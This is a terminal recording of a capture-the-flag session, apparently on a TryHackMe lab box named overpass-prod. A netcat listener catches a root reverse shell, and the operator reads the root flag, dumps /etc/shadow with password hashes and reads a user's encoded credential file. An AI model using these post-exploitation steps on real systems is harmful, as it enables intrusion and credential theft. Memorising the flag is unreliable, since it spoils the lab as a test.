@@ -1,0 +1,124 @@
+Script started on 2025-04-04 19:58:31+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 8504
+bash: cannot set terminal process group (1588): Inappropriate ioctl for device
+[Kbash: no job control in this shell
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid[Kid[Kid
+uid=0(root) gid=0(root) groups=0(root)
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# cd /root[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /root
+[Kcd /root[Kcd /root[K[?2004hcd /rootl[K[?2004l[Kcd /root
+root@overpass-prod:~# [K[?2004hroot@overpass-prod:~# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+buildStatus
+builds
+go
+root.txt
+src
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# cat root.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat root.txt
+[Kcat root.txt[Kcat root.txt[Kcat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 56
+drwx------  8 root root 4096 Jun 27  2020 .
+drwxr-xr-x 23 root root 4096 Jun 27  2020 ..
+lrwxrwxrwx  1 root root    9 Jun 27  2020 .bash_history -> /dev/null
+-rw-------  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  3 root root 4096 Jun 27  2020 .cache
+drwx------  3 root root 4096 Jun 27  2020 .local
+-rw-------  1 root root  184 Jun 27  2020 .profile
+drwx------  2 root root 4096 Jun 27  2020 .ssh
+-rw-r--r--  1 root root 9408 Apr  4 17:03 buildStatus
+drwx------  2 root root 4096 Jun 27  2020 builds
+drwxr-xr-x  4 root root 4096 Jun 27  2020 go
+-rw-------  1 root root   38 Jun 27  2020 root.txt
+drwx------  2 root root 4096 Jun 27  2020 src
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# ls .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls .ssh
+[Kls .ssh[Kls .ssh[Kls .ssh
+authorized_keys
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# cat /etc/shadow[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/shadow
+[Kcat /etc/shadow[Kcat /etc/shadow[Kcat /etc/shadow
+root:*:18295:0:99999:7:::
+daemon:*:18295:0:99999:7:::
+bin:*:18295:0:99999:7:::
+sys:*:18295:0:99999:7:::
+sync:*:18295:0:99999:7:::
+games:*:18295:0:99999:7:::
+man:*:18295:0:99999:7:::
+lp:*:18295:0:99999:7:::
+mail:*:18295:0:99999:7:::
+news:*:18295:0:99999:7:::
+uucp:*:18295:0:99999:7:::
+proxy:*:18295:0:99999:7:::
+www-data:*:18295:0:99999:7:::
+backup:*:18295:0:99999:7:::
+list:*:18295:0:99999:7:::
+irc:*:18295:0:99999:7:::
+gnats:*:18295:0:99999:7:::
+nobody:*:18295:0:99999:7:::
+systemd-network:*:18295:0:99999:7:::
+systemd-resolve:*:18295:0:99999:7:::
+syslog:*:18295:0:99999:7:::
+messagebus:*:18295:0:99999:7:::
+_apt:*:18295:0:99999:7:::
+lxd:*:18295:0:99999:7:::
+uuidd:*:18295:0:99999:7:::
+dnsmasq:*:18295:0:99999:7:::
+landscape:*:18295:0:99999:7:::
+pollinate:*:18295:0:99999:7:::
+sshd:*:18440:0:99999:7:::
+tryhackme:$6$L2Uquy5z8Ih49u4B$.imUQU4XnpmeAt5NBilOxCKPg/figRmNfHUQQuRz9jgcKDdrE1LMQzq92IDuaCCCl1zTXV8uX8A7VjtFuw9Nd/:18440:0:99999:7:::
+james:$6$9gnRHyG3$L0NNbSkM6s3ZmJzKDMHiSSDy9YC5OLMy3KTkfBlDkVJrplf65VJfCFudRQ/MrdtfCj.fF6Js.iLRM8UjzUqzb/:18440:0:99999:7:::
+root@overpass-prod:~# [Kroot@overpass-prod:~# [K[?2004hroot@overpass-prod:~# cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home[Kcd /home[Kcd /home
+root@overpass-prod:/home# [K[?2004hroot@overpass-prod:/home# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+james
+tryhackme
+root@overpass-prod:/home# [Kroot@overpass-prod:/home# [K[?2004hroot@overpass-prod:/home# cat /root/.ssh/aut    [Khorized_keys[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /root/.ssh/authorized_keys
+[Kcat /root/.ssh/authorized_keys[Kcat /root/.ssh/authorized_keys[Kcat /root/.ssh/authorized_keys
+root@overpass-prod:/home# [Kroot@overpass-prod:/home# [K[?2004hroot@overpass-prod:/home# ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 16
+drwxr-xr-x  4 root      root      4096 Jun 27  2020 .
+drwxr-xr-x 23 root      root      4096 Jun 27  2020 ..
+drwxr-xr-x  6 james     james     4096 Jun 27  2020 james
+drwx------  6 tryhackme tryhackme 4096 Sep 24  2020 tryhackme
+root@overpass-prod:/home# [Kroot@overpass-prod:/home# [K[?2004hroot@overpass-prod:/home# cd try        [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd try	
+[Kcd try[Kcd try[Kcd tryhackme/
+root@overpass-prod:/home/tryhackme# [Kroot@overpass-prod:/home/tryhackme# [K[?2004hroot@overpass-prod:/home/tryhackme# ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+go
+resources
+server
+root@overpass-prod:/home/tryhackme# [Kroot@overpass-prod:/home/tryhackme# [K[?2004hroot@overpass-prod:/home/tryhackme# cd ../[Cjames[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ../james
+[Kcd ../james[Kcd ../james[Kcd ../james
+root@overpass-prod:/home/james# [Kroot@overpass-prod:/home/james# [K[?2004hroot@overpass-prod:/home/james# ls 0[K-al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 48
+drwxr-xr-x 6 james james 4096 Jun 27  2020 .
+drwxr-xr-x 4 root  root  4096 Jun 27  2020 ..
+lrwxrwxrwx 1 james james    9 Jun 27  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 james james  220 Jun 27  2020 .bash_logout
+-rw-r--r-- 1 james james 3771 Jun 27  2020 .bashrc
+drwx------ 2 james james 4096 Jun 27  2020 .cache
+drwx------ 3 james james 4096 Jun 27  2020 .gnupg
+drwxrwxr-x 3 james james 4096 Jun 27  2020 .local
+-rw-r--r-- 1 james james   49 Jun 27  2020 .overpass
+-rw-r--r-- 1 james james  807 Jun 27  2020 .profile
+drwx------ 2 james james 4096 Jun 27  2020 .ssh
+-rw-rw-r-- 1 james james  438 Jun 27  2020 todo.txt
+-rw-rw-r-- 1 james james   38 Jun 27  2020 user.txt
+root@overpass-prod:/home/james# [Kroot@overpass-prod:/home/james# [K[?2004hroot@overpass-prod:/home/james# cd .overpass[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .overpass
+[Kcd .overpass[Kcd .overpass[Kcd .overpass
+bash: cd: .overpass: Not a directory
+root@overpass-prod:/home/james# [Kroot@overpass-prod:/home/james# [K[?2004hroot@overpass-prod:/home/james# cat .overpass[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat .overpass
+[Kcat .overpass[Kcat .overpass[Kcat .overpass
+,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.root@overpass-prod:/home/james# [K,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.root@overpass-prod:/home/james# [K[?2004h,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.root@overpass-prod:/home/james# [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Kroot@overpass-prod:/home/james# [Kroot@overpass-prod:/home/james# [K[?2004hroot@overpass-prod:/home/james# exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2025-04-04 20:14:08+03:00 [COMMAND_EXIT_CODE="0"]
